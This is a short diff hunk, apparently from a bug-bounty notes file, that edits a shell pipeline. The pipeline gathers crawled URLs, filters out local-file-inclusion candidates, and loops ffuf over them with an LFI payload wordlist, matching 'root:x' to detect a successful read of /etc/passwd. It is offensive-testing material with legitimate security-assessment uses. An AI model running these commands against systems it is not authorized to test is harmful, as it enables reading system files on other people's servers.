@@ -7,7 +7,7 @@ cat katana.txt | sort -u | urldedupe > urls.txt
 
 cat urls.txt | gf lfi | qsreplace FUZZ > lfi.txt
 
-ffuf -u FUZZ -w lfi.txt:URL -w lfiPayloads.txt:PAYLOAD -u URL -mr "root:x"
+cat lfiTest.txt | while read url; do ffuf -u $url -w lfiPayloads.txt -mr "root:x"; done
 
 ```
 
